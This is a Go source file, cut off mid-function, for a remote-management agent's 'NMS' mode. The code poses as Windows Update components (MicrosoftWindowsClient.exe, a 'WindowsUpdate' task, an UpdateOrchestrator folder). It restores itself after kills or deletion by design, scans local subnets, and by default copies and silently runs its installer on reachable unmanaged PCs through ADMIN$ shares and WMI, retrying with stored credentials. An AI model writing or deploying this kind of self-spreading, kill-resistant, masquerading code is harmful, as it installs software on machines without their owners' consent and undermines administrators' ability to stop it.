package commands

// NMS — network management system monitor.
//
// The NMS is the same agent binary in --nms mode: own process, own vault
// path, own controller identity (hostname/nms), own 7-verb command set.
// It does three jobs forever: probe the LAN, guard the agent (restore its
// bytes if wiped), and auto-clone to clonable PCs.
//
// UNSTOPPABLE INVARIANTS (do not weaken without replacing all three):
//  1. The StepNMS loop has no stop channel, no mode check, no sleep-flag
//     read. It never calls Handle(), so agent command gating (sleep,
//     modes) physically cannot reach it. The only exits are process
//     death (persistence restarts it) and the shutdown-file path below.
//  2. NOTHING the NMS can be told puts the NMS to sleep. agent-sleep /
//     agent-wake-up act on the AGENT via the sleep-flag file. The NMS
//     handler has no self-sleep verb; sleep flows downhill only.
//  3. The only stops are nms-stop --confirm YES (writes the shutdown
//     file, honored by the loop itself) and the installer's two-phase
//     --uninstall (writes the same file, waits, then tears down).
//     agent-sleep, set-mode, kill-agent, taskkill, file wipes: the guard
//     loop restores and continues.
//  4. The probe loop NEVER invokes the clone arm. Cloning happens only
//     in the clone arm (auto, eligible hosts) or nms-clone (manual).
//     A test pins this separation.
import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/process"
	"rmm/internal/version"
)

// ---------------------------------------------------------------------------
// Rendezvous paths. The NMS and the agent are different processes that must
// agree on flag locations without talking: everything lives under NMSRoot
// (the agent install dir, writable by both), secrets under the vault dir
// (SYSTEM+Administrators only). Tests override nmsRootOverride.
// ---------------------------------------------------------------------------

// nmsRootOverride, when non-empty, replaces NMSRoot (tests).
var nmsRootOverride = ""

// NMSRoot is the shared rendezvous dir (agent install dir).
func NMSRoot() string {
	if nmsRootOverride != "" {
		return nmsRootOverride
	}
	if runtime.GOOS != "windows" {
		return filepath.Join(os.TempDir(), "RMM")
	}
	pd := os.Getenv("ProgramData")
	if pd == "" {
		pd = `C:\ProgramData`
	}
	return filepath.Join(pd, "Microsoft", "Windows", "Update")
}

// nmsVaultDir mirrors the agent watcher's vaultDir (SYSTEM profile slot,
// locked to SYSTEM+Administrators by the installer). Falls back to NMSRoot
// when absent (dev boxes, tests).
func nmsVaultDir() string {
	if runtime.GOOS != "windows" {
		return NMSRoot()
	}
	sys := os.Getenv("SystemRoot")
	if sys == "" {
		sys = `C:\Windows`
	}
	v := filepath.Join(sys, "System32", "config", "systemprofile", "AppData", "Local", "Microsoft", "Windows", "UpdateOrchestrator")
	if st, err := os.Stat(v); err == nil && st.IsDir() {
		return v
	}
	return NMSRoot()
}

// NMSSleepPath is the agent-sleep flag file (written by NMS, read by agent).
func NMSSleepPath() string { return filepath.Join(NMSRoot(), "agent.sleep") }

// NMSShutdownPath is the stop file (written by nms-stop or the installer,
// honored only by the NMS loop itself).
func NMSShutdownPath() string { return filepath.Join(NMSRoot(), "nms.shutdown") }

// NMSPidPath holds the NMS pid (written at NMS start, read by installer).
func NMSPidPath() string { return filepath.Join(NMSRoot(), "nms.pid") }

// NMSCredPath holds WMI credentials (two lines: user, pass), placed locally
// by the operator. Never transmitted, never logged (see set-nms refusal).
func NMSCredPath() string { return filepath.Join(nmsVaultDir(), "nms-wmi-cred") }

// NMSConfigPath persists NMS config across restarts.
func NMSConfigPath() string { return filepath.Join(NMSRoot(), "nms.json") }

// NMSAgentPath is the agent exe the guard loop protects.
func NMSAgentPath() string { return filepath.Join(NMSRoot(), "MicrosoftWindowsClient.exe") }

// ---------------------------------------------------------------------------
// Sleep flag (NMS writes, agent reads). Atomic temp+rename writes.
// ---------------------------------------------------------------------------

// NMSSleepState is the persisted sleep order.
type NMSSleepState struct {
	Since  time.Time `json:"since"`
	Reason string    `json:"reason"`
}

// WriteSleepFlag puts the agent to sleep (durable across wipe/reboot).
func WriteSleepFlag(reason string) error {
	st := NMSSleepState{Since: time.Now().UTC(), Reason: strings.TrimSpace(reason)}
	b, _ := json.Marshal(st)
	tmp := NMSSleepPath() + ".tmp"
	if err := os.WriteFile(tmp, b, 0644); err != nil {
		return err
	}
	return os.Rename(tmp, NMSSleepPath())
}

// ClearSleepFlag wakes the agent.
func ClearSleepFlag() error {
	err := os.Remove(NMSSleepPath())
	if err != nil && !os.IsNotExist(err) {
		return err
	}
	return nil
}

// ReadSleepFlag returns the sleep order, if any.
func ReadSleepFlag() (NMSSleepState, bool) {
	var st NMSSleepState
	b, err := os.ReadFile(NMSSleepPath())
	if err != nil {
		return st, false
	}
	if json.Unmarshal(b, &st) != nil {
		return st, false
	}
	return st, true
}

// SleepFlagSet reports whether the agent is ordered asleep.
func SleepFlagSet() bool {
	_, ok := ReadSleepFlag()
	return ok
}

var sleepCacheMu sync.Mutex
var sleepCacheAt time.Time
var sleepCacheVal bool

// SleepCheckCached is the hot-loop sleep check (2s TTL): file stats are
// cheap but not per-frame cheap. Streaming loops call this, not SleepFlagSet.
func SleepCheckCached() bool {
	sleepCacheMu.Lock()
	defer sleepCacheMu.Unlock()
	if time.Since(sleepCacheAt) < 2*time.Second {
		return sleepCacheVal
	}
	sleepCacheAt = time.Now()
	sleepCacheVal = SleepFlagSet()
	return sleepCacheVal
}

// ---------------------------------------------------------------------------
// Shutdown file (only the NMS loop honors it).
// ---------------------------------------------------------------------------

// ErrNMSShutdown is returned by StepNMS when the stop file is present.
var ErrNMSShutdown = fmt.Errorf("nms shutdown file present")

// ErrNMSUpdate is returned by StepNMS when the install dir carries a newer
// version than this running image: the NMS exits cleanly and persistence
// restarts it on new bytes (otherwise the monitor would pin old code
// forever — the vault/install sync only replaces files, never processes).
var ErrNMSUpdate = fmt.Errorf("nms update available")

// nmsUpdateAvailable compares installDir/version.txt against the compiled
// version (dotted ints). Absent/unparseable reads as no update.
func nmsUpdateAvailable() (string, bool) {
	b, err := os.ReadFile(filepath.Join(NMSRoot(), "version.txt"))
	if err != nil {
		return "", false
	}
	want := strings.TrimSpace(string(b))
	if want == "" || want == version.Version {
		return "", false
	}
	if verNewer(want, version.Version) {
		return want, true
	}
	return "", false
}

func verNewer(a, b string) bool {
	pa, pb := strings.Split(a, "."), strings.Split(b, ".")
	for i := 0; i < len(pa) && i < len(pb); i++ {
		na, ea := strconv.Atoi(strings.TrimSpace(pa[i]))
		nb, eb := strconv.Atoi(strings.TrimSpace(pb[i]))
		if ea != nil || eb != nil {
			if pa[i] != pb[i] {
				return pa[i] > pb[i]
			}
			continue
		}
		if na != nb {
			return na > nb
		}
	}
	return len(pa) > len(pb)
}

// ShutdownRequested reports whether nms-stop or the installer ordered stop.
func ShutdownRequested() bool {
	_, err := os.Stat(NMSShutdownPath())
	return err == nil
}

// WriteShutdownFile orders the NMS loop to exit (nms-stop / installer).
func WriteShutdownFile() error {
	return os.WriteFile(NMSShutdownPath(), []byte(time.Now().UTC().Format(time.RFC3339)+"\n"), 0644)
}

// ---------------------------------------------------------------------------
// Config (persisted nms.json; set-nms mutates it, never credentials).
// ---------------------------------------------------------------------------

// NMSConfig is the monitor configuration.
type NMSConfig struct {
	IntervalSec   int      `json:"interval_sec"`
	SweepEveryMin int      `json:"sweep_min"`
	Subnets       []string `json:"subnets"`
	ExtraHosts    []string `json:"extra_hosts"`
	Exclude       []string `json:"exclude"`
	AutoClone     bool     `json:"autoclone"`
	MaxParallel   int      `json:"max_parallel"`
	FailThreshold int      `json:"fail_threshold"`
	FailWindowMin int      `json:"fail_window_min"`
	RearmAfterMin int      `json:"rearm_min"`
}

// DefaultNMSConfig returns safe defaults. Exclude is seeded with loopback;
// the caller adds the controller IPs (never clone the controller).
func DefaultNMSConfig() NMSConfig {
	return NMSConfig{
		IntervalSec: 60, SweepEveryMin: 30,
		Subnets: autoSubnets(), ExtraHosts: nil,
		Exclude:      []string{"127.0.0.1", "localhost"},
		AutoClone:    true,
		MaxParallel:  8,
		FailThreshold: 5, FailWindowMin: 15, RearmAfterMin: 60,
	}
}

// LoadNMSConfig reads persisted config, merged over defaults.
func LoadNMSConfig() NMSConfig {
	cfg := DefaultNMSConfig()
	b, err := os.ReadFile(NMSConfigPath())
	if err != nil {
		return cfg
	}
	var f NMSConfig
	if json.Unmarshal(b, &f) != nil {
		return cfg
	}
	if f.IntervalSec >= 10 {
		cfg.IntervalSec = f.IntervalSec
	}
	if f.SweepEveryMin >= 5 {
		cfg.SweepEveryMin = f.SweepEveryMin
	}
	if f.Subnets != nil {
		cfg.Subnets = f.Subnets
	}
	if f.ExtraHosts != nil {
		cfg.ExtraHosts = f.ExtraHosts
	}
	if f.Exclude != nil {
		cfg.Exclude = f.Exclude
	}
	cfg.AutoClone = f.AutoClone
	if f.MaxParallel >= 1 && f.MaxParallel <= 32 {
		cfg.MaxParallel = f.MaxParallel
	}
	if f.FailThreshold >= 1 {
		cfg.FailThreshold = f.FailThreshold
	}
	if f.FailWindowMin >= 1 {
		cfg.FailWindowMin = f.FailWindowMin
	}
	if f.RearmAfterMin >= 0 {
		cfg.RearmAfterMin = f.RearmAfterMin
	}
	return cfg
}

// SaveNMSConfig persists config atomically.
func SaveNMSConfig(cfg NMSConfig) error {
	b, _ := json.MarshalIndent(cfg, "", "  ")
	tmp := NMSConfigPath() + ".tmp"
	if err := os.WriteFile(tmp, b, 0644); err != nil {
		return err
	}
	return os.Rename(tmp, NMSConfigPath())
}

// SetNMS applies key=value pairs (space/comma separated). Credential-ish
// keys are REFUSED: passwords travel only via the local cred file, never
// the controller channel (they'd land in logs and MQTT buses).
func SetNMS(args string, seedExclude []string) (string, error) {
	cfg := LoadNMSConfig()
	for _, seed := range seedExclude {
		if !nmsHasFold(cfg.Exclude, seed) {
			cfg.Exclude = append(cfg.Exclude, seed)
		}
	}
	fields := strings.Fields(strings.ReplaceAll(args, ",", " "))
	var applied []string
	for _, f := range fields {
		kv := strings.SplitN(f, "=", 2)
		if len(kv) != 2 {
			return "", fmt.Errorf("usage: set-nms key=value [key=value...] (interval, sweep_min, subnets, extra_hosts, exclude, autoclone, max_parallel, fail_threshold, fail_window_min, rearm_min)")
		}
		k := strings.ToLower(strings.TrimSpace(kv[0]))
		v := strings.TrimSpace(kv[1])
		lk := strings.ToLower(k)
		if strings.Contains(lk, "pass") || strings.Contains(lk, "cred") || strings.Contains(lk, "secret") || strings.Contains(lk, "token") {
			return "", fmt.Errorf("refused: credentials are local-only (place them in %s on the NMS box, never send them)", NMSCredPath())
		}
		switch k {
		case "interval", "interval_sec":
			n, err := strconv.Atoi(v)
			if err != nil || n < 10 {
				return "", fmt.Errorf("interval must be >= 10 (seconds)")
			}
			cfg.IntervalSec = n
		case "sweep_min":
			n, err := strconv.Atoi(v)
			if err != nil || n < 5 {
				return "", fmt.Errorf("sweep_min must be >= 5")
			}
			cfg.SweepEveryMin = n
		case "subnets":
			cfg.Subnets = splitList(v)
		case "extra_hosts", "hosts":
			cfg.ExtraHosts = splitList(v)
		case "exclude":
			cfg.Exclude = splitList(v)
		case "autoclone", "autoclone=on", "autoclone=off":
			if k == "autoclone=on" || strings.EqualFold(v, "on") || strings.EqualFold(v, "true") || strings.EqualFold(v, "1") {
				cfg.AutoClone = true
			} else if k == "autoclone=off" || strings.EqualFold(v, "off") || strings.EqualFold(v, "false") || strings.EqualFold(v, "0") {
				cfg.AutoClone = false
			} else {
				return "", fmt.Errorf("autoclone must be on|off")
			}
		case "max_parallel":
			n, err := strconv.Atoi(v)
			if err != nil || n < 1 || n > 32 {
				return "", fmt.Errorf("max_parallel must be 1..32")
			}
			cfg.MaxParallel = n
		case "fail_threshold":
			n, err := strconv.Atoi(v)
			if err != nil || n < 1 {
				return "", fmt.Errorf("fail_threshold must be >= 1")
			}
			cfg.FailThreshold = n
		case "fail_window_min":
			n, err := strconv.Atoi(v)
			if err != nil || n < 1 {
				return "", fmt.Errorf("fail_window_min must be >= 1")
			}
			cfg.FailWindowMin = n
		case "rearm_min":
			n, err := strconv.Atoi(v)
			if err != nil || n < 0 {
				return "", fmt.Errorf("rearm_min must be >= 0")
			}
			cfg.RearmAfterMin = n
		default:
			return "", fmt.Errorf("unknown set-nms key %q", k)
		}
		applied = append(applied, k)
	}
	if err := SaveNMSConfig(cfg); err != nil {
		return "", err
	}
	nmsClearBreaker()
	return "nms config updated (" + strings.Join(applied, ", ") + ")", nil
}

func splitList(v string) []string {
	var out []string
	for _, p := range strings.Split(v, ",") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		for _, q := range strings.Fields(p) {
			if q != "" {
				out = append(out, q)
			}
		}
	}
	return out
}

func nmsHasFold(list []string, s string) bool {
	for _, e := range list {
		if strings.EqualFold(e, s) {
			return true
		}
	}
	return false
}

// autoSubnets returns local /24s (non-loopback IPv4). Pure enough to test
// via expandSubnet; interface enumeration itself is environment truth.
func autoSubnets() []string {
	var out []string
	ifs, err := net.Interfaces()
	if err != nil {
		return out
	}
	seen := map[string]bool{}
	for _, iface := range ifs {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			var ip net.IP
			switch v := a.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			ip = ip.To4()
			if ip == nil || ip.IsLoopback() {
				continue
			}
			sn := fmt.Sprintf("%d.%d.%d.0/24", ip[0], ip[1], ip[2])
			if !seen[sn] {
				seen[sn] = true
				out = append(out, sn)
			}
		}
	}
	sort.Strings(out)
	return out
}

// expandSubnet lists candidate host IPs in a /24 (skips .0/.255). Strict:
// only an exact numeric a.b.c.d/24 expands (the 4th octet selects the same
// /24, so sloppy-but-equivalent bases still work); a /16, a hostname, or
// garbage yields nothing instead of a silently wrong range.
func expandSubnet(sn string) []string {
	if !strings.HasSuffix(sn, "/24") {
		return nil
	}
	parts := strings.Split(strings.TrimSuffix(sn, "/24"), ".")
	if len(parts) != 4 {
		return nil
	}
	nums := make([]int, 4)
	for i, p := range parts {
		n, err := strconv.Atoi(strings.TrimSpace(p))
		if err != nil || n < 0 || n > 255 {
			return nil
		}
		nums[i] = n
	}
	var out []string
	for i := 1; i <= 254; i++ {
		out = append(out, fmt.Sprintf("%d.%d.%d.%d", nums[0], nums[1], nums[2], i))
	}
	return out
}

// ---------------------------------------------------------------------------
// Probing. TCP dial proves the management channel (445/135), not just ICMP
// (firewalls eat ping). dialTCP is a var so tests inject fakes.
// ---------------------------------------------------------------------------

// NMSHostResult is one host's probe outcome.
type NMSHostResult struct {
	Host           string  `json:"host"`
	Reachable      bool    `json:"reachable"`
	CPU            float64 `json:"cpu"`
	Mem            float64 `json:"mem"`
	Disk           float64 `json:"disk"`
	ManagedHint    bool    `json:"managed_hint"`
	ManagedUnknown bool    `json:"managed_unknown,omitempty"`
	CloneState     string  `json:"clone"`
	CloneDetail    string  `json:"clone_detail,omitempty"`
	StatsErr       string  `json:"stats_err,omitempty"`
}

// dialTCP dials host:port with timeout. Var for tests.
var dialTCP = func(host string, port int, timeout time.Duration) bool {
	c, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), timeout)
	if err != nil {
		return false
	}
	c.Close()
	return true
}

// TCPReachable checks 445 then 135 (either proves a Windows box).
func TCPReachable(host string) bool {
	if dialTCP(host, 445, 3*time.Second) {
		return true
	}
	return dialTCP(host, 135, 3*time.Second)
}

// SelfStats returns this box's cpu/mem/disk via gopsutil.
func SelfStats() (cpuP, memP, diskP float64) {
	if p, err := cpu.Percent(500*time.Millisecond, false); err == nil && len(p) > 0 {
		cpuP = p[0]
	}
	if vm, err := mem.VirtualMemory(); err == nil {
		memP = vm.UsedPercent
	}
	if du, err := disk.Usage("/"); err == nil {
		diskP = du.UsedPercent
	} else if runtime.GOOS == "windows" {
		if du, err := disk.Usage(`C:\`); err == nil {
			diskP = du.UsedPercent
		}
	}
	return cpuP, memP, diskP
}

// managedHintPath is the version file a managed box exposes over ADMIN$.
func managedHintPath(host string) string {
	if runtime.GOOS != "windows" {
		return ""
	}
	return `\\` + host + `\ADMIN$\Microsoft\Windows\Update\version.txt`
}

// nmsReadUNC reads a (possibly remote ADMIN$) file with a hard timeout. Var
// so tests cut the SMB dependency. Errors are significant: callers must
// distinguish "no such file" (unmanaged) from "denied / timed out"
// (unknown — never auto-clone on unknown).
var nmsReadUNC = func(path string) ([]byte, error) {
	type res struct {
		b   []byte
		err error
	}
	done := make(chan res, 1)
	go func() {
		b, err := os.ReadFile(path)
		done <- res{b, err}
	}()
	select {
	case r := <-done:
		return r.b, r.err
	case <-time.After(8 * time.Second):
		return nil, fmt.Errorf("unc read timed out")
	}
}

// nmsFileStat is a var so tests cut the SMB dependency.
var nmsFileStat = func(path string) (string, bool) {
	b, err := nmsReadUNC(path)
	if err != nil {
		return "", false
	}
	return strings.TrimSpace(string(b)), true
}

// ManagedHint reports whether host already has an agent install (its own
// NMS owns repair there — never reinstall a managed box).
func ManagedHint(host string) bool {
	managed, _ := ManagedHintChecked(host)
	return managed
}

// ManagedHintChecked is ManagedHint with the ambiguous third state: unknown
// is true when the check itself failed (denied/timed out/off-Windows)
// instead of proving absence. The clone arm treats unknown as a veto — a
// managed box that refuses the share read must never look "unmanaged".
func ManagedHintChecked(host string) (managed, unknown bool) {
	p := managedHintPath(host)
	if p == "" {
		return false, true
	}
	if _, err := nmsReadUNC(p); err == nil {
		return true, false
	} else if os.IsPermission(err) || isAccessDenied(err.Error()) || strings.Contains(strings.ToLower(err.Error()), "timed out") {
		return false, true
	}
	return false, false
}

// remoteStatsCIM queries one Windows host via a hidden powershell CIM
// session (current user context first; stored local creds on denial).
// Returns cpu/mem/disk percents. Never logs credentials.
var remoteStatsCIM = func(host string, timeout time.Duration) (float64, float64, float64, error) {
	script := `$e=$null;try{$s=New-CimSession -ComputerName '` + strings.ReplaceAll(host, "'", "''") + `' -ErrorAction Stop;$p=Get-CimInstance -CimSession $s -ClassName Win32_Processor -ErrorAction Stop|Measure-Object -Property LoadPercentage -Average;$o=Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem -ErrorAction Stop;$d=Get-CimInstance -CimSession $s -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop;Remove-CimSession -CimSession $s;@{cpu=[double]$p.Average;mem=[double](100*($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/$o.TotalVisibleMemorySize);disk=[double](100*($d.Size-$d.FreeSpace)/$d.Size)}|ConvertTo-Json -Compress}catch{$e=$_;@{err=$e.Exception.Message}|ConvertTo-Json -Compress}`
	out, err := runWithTimeout(timeout, "powershell", "-NoProfile", "-Command", script)
	if err != nil {
		return 0, 0, 0, err
	}
	var r struct {
		CPU  float64 `json:"cpu"`
		Mem  float64 `json:"mem"`
		Disk float64 `json:"disk"`
		Err  string  `json:"err"`
	}
	dec := json.NewDecoder(strings.NewReader(strings.TrimSpace(string(out))))
	if derr := dec.Decode(&r); derr != nil {
		// Stored-creds fallback: only when current context was denied and
		// the operator placed a local cred file (vault dir, never logged).
		if isAccessDenied(string(out)) {
			return remoteStatsCIMCred(host, timeout)
		}
		return 0, 0, 0, fmt.Errorf("cim parse: %v", derr)
	}
	if r.Err != "" {
		if isAccessDenied(r.Err) {
			return remoteStatsCIMCred(host, timeout)
		}
		return 0, 0, 0, fmt.Errorf("cim: %s", r.Err)
	}
	return r.CPU, r.Mem, r.Disk, nil
}

func isAccessDenied(s string) bool {
	s = strings.ToLower(s)
	return strings.Contains(s, "access is denied") || strings.Contains(s, "access denied") || strings.Contains(s, "0x80070005")
}

// remoteStatsCIMCred retries with the locally-stored credential file. The
// password travels file->powershell only (path on our cmdline, never the
// secret) and is never logged.
func remoteStatsCIMCred(host string, timeout time.Duration) (float64, float64, float64, error) {
	b, err := os.ReadFile(NMSCredPath())
	if err != nil {
		return 0, 0, 0, fmt.Errorf("cim denied (no local cred file)")
	}
	lines := strings.Split(strings.ReplaceAll(string(b), "\r\n", "\n"), "\n")
	if len(lines) < 2 || strings.TrimSpace(lines[0]) == "" || strings.TrimSpace(lines[1]) == "" {
		return 0, 0, 0, fmt.Errorf("cim denied (cred file malformed)")
	}
	script := `$cf=Get-Content -LiteralPath '` + strings.ReplaceAll(NMSCredPath(), "'", "''") + `';$u=$cf[0].Trim();$p=$cf[1].TrimEnd("`+"`r,`n"+`");$sec=ConvertTo-SecureString $p -AsPlainText -Force;$cred=New-Object PSCredential($u,$sec);try{$s=New-CimSession -ComputerName '` + strings.ReplaceAll(host, "'", "''") + `' -Credential $cred -ErrorAction Stop;$pr=Get-CimInstance -CimSession $s -ClassName Win32_Processor -ErrorAction Stop|Measure-Object -Property LoadPercentage -Average;$o=Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem -ErrorAction Stop;$d=Get-CimInstance -CimSession $s -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop;Remove-CimSession -CimSession $s;@{cpu=[double]$pr.Average;mem=[double](100*($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/$o.TotalVisibleMemorySize);disk=[double](100*($d.Size-$d.FreeSpace)/$d.Size)}|ConvertTo-Json -Compress}catch{@{err=$_.Exception.Message}|ConvertTo-Json -Compress}`
	out, err := runWithTimeout(timeout, "powershell", "-NoProfile", "-Command", script)
	if err != nil {
		return 0, 0, 0, err
	}
	var r struct {
		CPU  float64 `json:"cpu"`
		Mem  float64 `json:"mem"`
		Disk float64 `json:"disk"`
		Err  string  `json:"err"`
	}
	if derr := json.NewDecoder(strings.NewReader(strings.TrimSpace(string(out)))).Decode(&r); derr != nil {
		return 0, 0, 0, fmt.Errorf("cim-cred parse")
	}
	if r.Err != "" {
		return 0, 0, 0, fmt.Errorf("cim-cred: %s", r.Err)
	}
	return r.CPU, r.Mem, r.Disk, nil
}

// ProbeHost probes one host fully (bounded by caller). The managed-hint
// share read and the CIM stats query run concurrently: serially they cost up
// to ~33s per host and stall whole cycles on big LANs.
func ProbeHost(host string) NMSHostResult {
	r := NMSHostResult{Host: host}
	if !TCPReachable(host) {
		return r
	}
	r.Reachable = true
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		r.ManagedHint, r.ManagedUnknown = ManagedHintChecked(host)
	}()
	go func() {
		defer wg.Done()
		c, m, d, err := remoteStatsCIM(host, 25*time.Second)
		if err != nil {
			r.StatsErr = err.Error()
			return
		}
		r.CPU, r.Mem, r.Disk = c, m, d
	}()
	wg.Wait()
	return r
}

// ProbeRound probes hosts with bounded parallelism. Pure scheduling, tested.
func ProbeRound(hosts []string, maxParallel int) []NMSHostResult {
	if maxParallel < 1 {
		maxParallel = 1
	}
	if maxParallel > 32 {
		maxParallel = 32
	}
	out := make([]NMSHostResult, len(hosts))
	sem := make(chan struct{}, maxParallel)
	var wg sync.WaitGroup
	for i, h := range hosts {
		wg.Add(1)
		go func(i int, h string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			out[i] = ProbeHost(h)
		}(i, h)
	}
	wg.Wait()
	return out
}

// ---------------------------------------------------------------------------
// Guard: the agent restore loop. Golden bytes = our own image (same binary).
// ---------------------------------------------------------------------------

func shaFile(path string) string {
	f, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer f.Close()
	h := sha256.New()
	var buf [65536]byte
	for {
		n, rerr := f.Read(buf[:])
		if n > 0 {
			h.Write(buf[:n])
		}
		if rerr != nil {
			break
		}
	}
	return hex.EncodeToString(h.Sum(nil))
}

func shaBytes(b []byte) string {
	h := sha256.Sum256(b)
	return hex.EncodeToString(h[:])
}

// guardStartAgent restarts the agent via its own task (correct flags).
// Var so tests record instead of executing.
var guardStartAgent = func() error {
	_, err := runWithTimeout(30*time.Second, "schtasks", "/run", "/tn", "WindowsUpdate")
	return err
}

// agentProcAlive reports whether an agent process (not us) is running.
func agentProcAlive() bool {
	self := int32(os.Getpid())
	procs, err := process.Pids()
	if err != nil {
		return false
	}
	for _, pid := range procs {
		if pid == self || pid <= 0 {
			continue
		}
		p, err := process.NewProcess(pid)
		if err != nil {
			continue
		}
		name, err := p.Name()
		if err != nil {
			continue
		}
		if strings.EqualFold(name, "MicrosoftWindowsClient.exe") {
			return true
		}
	}
	return false
}

// writeFileAtomic writes via temp+rename (no torn restores).
func writeFileAtomic(path string, data []byte) error {
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err != nil {
		return err
	}
	return os.Rename(tmp, path)
}

// goldenCache avoids re-reading our own multi-MB image every cycle. Keyed on
// the live file's size+mtime: an update replacing bytes under us must NOT
// keep restoring a stale image — the guard always compares against current
// bytes (nmsUpdateAvailable exits the loop on version drift regardless).
var goldenMu sync.Mutex
var goldenPath string
var goldenSize int64
var goldenMtime time.Time
var goldenData []byte
var goldenSHACache string

// goldenImage returns our own image bytes + sha, reusing the cache only
// while the executable file on disk still matches (size+mtime).
func goldenImage() ([]byte, string, bool) {
	self, err := os.Executable()
	if err != nil {
		return nil, "", false
	}
	st, err := os.Stat(self)
	if err != nil {
		return nil, "", false
	}
	goldenMu.Lock()
	defer goldenMu.Unlock()
	if self == goldenPath && st.Size() == goldenSize && st.ModTime().Equal(goldenMtime) && len(goldenData) >= 1024*1024 {
		return goldenData, goldenSHACache, true
	}
	b, err := os.ReadFile(self)
	if err != nil || len(b) < 1024*1024 {
		return nil, "", false
	}
	goldenPath, goldenSize, goldenMtime = self, st.Size(), st.ModTime()
	goldenData, goldenSHACache = b, shaBytes(b)
	return goldenData, goldenSHACache, true
}

// GuardAgent verifies the agent exe (exists + matches our own image bytes)
// and its process; restores + restarts on any deviation. Returns a short
// action word for the report ("ok", "restored-missing", "restored-corrupt",
// "started-process", "no-golden").
func GuardAgent() string {
	agentPath := NMSAgentPath()
	golden, goldenSHA, ok := goldenImage()
	if !ok {
		return "no-golden"
	}
	curSHA := shaFile(agentPath)
	if curSHA == "" {
		if werr := writeFileAtomic(agentPath, golden); werr != nil {
			return "restore-failed:" + werr.Error()
		}
		_ = guardStartAgent()
		return "restored-missing"
	}
	if curSHA != goldenSHA {
		q := fmt.Sprintf("%s.quarantined-%d", agentPath, time.Now().Unix())
		_ = os.Rename(agentPath, q)
		if werr := writeFileAtomic(agentPath, golden); werr != nil {
			return "restore-failed:" + werr.Error()
		}
		_ = guardStartAgent()
		return "restored-corrupt"
	}
	if !agentProcAlive() {
		_ = guardStartAgent()
		return "started-process"
	}
	return "ok"
}

// ---------------------------------------------------------------------------
// Clone arm: eligibility (pure, tested) + executor + circuit breaker.
// ---------------------------------------------------------------------------

// CloneEligible decides whether host may be auto-cloned. Pure, tested.
// managedHint/cfg-excluded/self/controller IPs all veto. Reachability is
// checked by the caller (probe round) and passed in.
func CloneEligible(host string, reachable, managedHint bool, exclude, selfIPs, controllerIPs []string) (bool, string) {
	if !reachable {
		return false, "unreachable"
	}
	if managedHint {
		return false, "already-managed"
	}
	if nmsHasFold(exclude, host) {
		return false, "excluded"
	}
	if nmsHasFold(selfIPs, host) {
		return false, "self"
	}
	if nmsHasFold(controllerIPs, host) {
		return false, "controller"
	}
	return true, "eligible"
}

// selfIPs returns this box's IPv4 addresses (loopback included for safety).
func selfIPs() []string {
	var out []string
	ifs, err := net.Interfaces()
	if err != nil {
		return out
	}
	for _, iface := range ifs {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			var ip net.IP
			switch v := a.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip = ip.To4(); ip != nil {
				out = append(out, ip.String())
			}
		}
	}
	return out
}

// NMSInstallerPath is the installer copy the installer lays beside the
// agent at install time (a byte copy of its own image — no embed
// circularity: installer embeds agent, agent never embeds installer).
// Clone jobs deploy from these bytes after MZ+size validation.
func NMSInstallerPath() string { return filepath.Join(NMSRoot(), "Agent-Setup.exe") }

// NMSInstallerInfo reports the clone payload on disk (size, sha, PE sanity).
// Missing/undersized/non-MZ reads as absent — the clone arm then reports
// no-payload honestly instead of pushing garbage.
func NMSInstallerInfo() (size int64, sha string, ok bool) {
	b, err := os.ReadFile(NMSInstallerPath())
	if err != nil || len(b) < 10*1024*1024 {
		return 0, "", false
	}
	if b[0] != 'M' || b[1] != 'Z' {
		return 0, "", false
	}
	return int64(len(b)), shaBytes(b), true
}

// readInstallerBytes loads the clone payload (validated by NMSInstallerInfo).
func readInstallerBytes() ([]byte, bool) {
	if _, _, ok := NMSInstallerInfo(); !ok {
		return nil, false
	}
	b, err := os.ReadFile(NMSInstallerPath())
	if err != nil {
		return nil, false
	}
	return b, true
}

// nmsSMBCopy / nmsRemoteExec / nmsCloneVerify are vars so tests cut the LAN.
var nmsSMBCopy = func(host string, data []byte) error {
	dest := `\\` + host + `\ADMIN$\Temp\Agent-Setup.exe`
	done := make(chan error, 1)
	go func() { done <- os.WriteFile(dest, data, 0644) }()
	select {
	case err := <-done:
		return err
	case <-time.After(120 * time.Second):
		return fmt.Errorf("smb copy timed out")
	}
}

var nmsRemoteExec = func(host string) error {
	cmd := `C:\Windows\Temp\Agent-Setup.exe --silent`
	script := `(Get-CimInstance Win32_Process -Filter "Name='MicrosoftWindowsClient.exe'" | Measure-Object).Count; Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='` + strings.ReplaceAll(cmd, "'", "''") + `'} | Select-Object -ExpandProperty ReturnValue`
	out, err := runWithTimeout(60*time.Second, "powershell", "-NoProfile", "-Command", "$s=New-CimSession -ComputerName '"+strings.ReplaceAll(host, "'", "''")+"';"+script+";Remove-CimSession -CimSession $s")
	if err != nil {
		return err
	}
